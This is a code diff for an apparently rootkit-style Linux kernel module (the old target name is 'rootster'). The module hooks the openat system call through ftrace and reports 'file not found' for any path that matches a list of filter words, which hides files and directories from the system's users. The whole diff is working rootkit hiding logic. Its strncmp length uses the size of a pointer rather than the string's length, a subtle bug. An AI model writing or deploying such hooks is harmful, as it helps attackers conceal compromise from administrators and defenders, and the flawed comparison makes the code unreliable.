@@ -1,6 +1,8 @@
 #include "openat.h"
+#include "../shared.h"
 #include "linux/kern_levels.h"
 #include "linux/linkage.h"
+#include "linux/list.h"
 #include <linux/fs.h>
 #include <linux/ftrace.h>
 #include <linux/kallsyms.h>
@@ -15,7 +17,9 @@
 
 asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
 
-const char *TARGET_DIR = "rootster";
+// const char *TARGET_DIR = "rootster";
+
+struct filter_word *element;
 
 asmlinkage long openat_hook(struct pt_regs *regs) {
   // printk(KERN_DEBUG "Hooked Openat");
@@ -27,10 +31,11 @@ asmlinkage long openat_hook(struct pt_regs *regs) {
   ret = strncpy_from_user(pathname, (char __user *)regs->si, sizeof(pathname));
   // printk(KERN_INFO "Listing dir: %s\n", pathname);
   if (ret > 0) {
-    /* Compare the pathname with your target string */
-    if (strncmp(pathname, TARGET_DIR, sizeof(&TARGET_DIR)) == 0) {
-      printk(KERN_INFO "Matched directory: %s\n", pathname);
-      return -ENOENT;
+    list_for_each_entry(element, &filter_words, list) {
+      if (strncmp(pathname, element->name, sizeof(&element->name)) == 0) {
+        printk(KERN_INFO "Matched directory: %s\n", pathname);
+        return -ENOENT;
+      }
     }
   }
 
